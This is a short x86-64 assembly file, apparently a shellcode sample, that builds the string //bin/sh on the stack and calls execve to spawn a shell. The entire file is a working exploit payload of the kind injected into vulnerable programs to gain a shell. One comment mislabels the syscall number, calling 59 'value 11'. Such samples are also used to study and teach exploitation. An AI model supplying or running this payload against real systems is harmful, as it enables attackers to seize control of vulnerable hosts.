; Author:	Trisna Quebe
; 64 bit shellcode for spawning a //bin/sh shell


section .text
	global _start

_start:
	xor rax, rax
	push rax			; NULL string terminator.
	mov rsi, 0x68732f6e69622f2f	; //bin/sh
	push rsi
        push rsp                        ; push the address of the stack.

	pop rdi				; put the stack-address into first param. RDI

	; zero values for second and third parameters. RSI, RDX
	xor rsi, rsi
	xor rdx, rdx

	push 59				; value 11 for execve() syscall.
	pop rax

	syscall

